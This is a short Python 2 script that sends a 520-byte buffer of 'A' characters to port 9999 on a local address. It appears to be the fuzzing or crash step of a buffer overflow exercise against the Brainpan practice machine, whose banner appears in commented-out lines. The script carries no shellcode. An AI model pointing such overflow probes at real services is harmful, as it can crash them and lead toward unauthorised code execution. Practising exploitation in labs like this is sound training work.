#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
    size = 520
    inputBuffer = "A" * size
    #content = "username="+inputBuffer+"&password=A"
    content = inputBuffer

    #-- Recreate the HTTP headers as seen from Wireshark --#
    #buffer  ="_|                            _|                                        \r\n"
    #buffer +="_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \r\n"
    #buffer +="_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\r\n"
    #buffer +="_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\r\n"
    #buffer +="_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\r\n"
    #buffer +="                                            _|                          \r\n"
    #buffer +="                                            _|\r\n"
    #buffer +="\r\n"
    #buffer +="[________________________ WELCOME TO BRAINPAN _________________________]\r\n"
    #buffer +="                          ENTER THE PASSWORD                              \r\n"
    #buffer +="\r\n"
    #buffer +="                          >> \r\n"

    #buffer += content
    buffer = content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.0.30",9999))
    s.send(buffer)

    s.close()

    print "\nDone!"
except:
    print "Could not connect!"

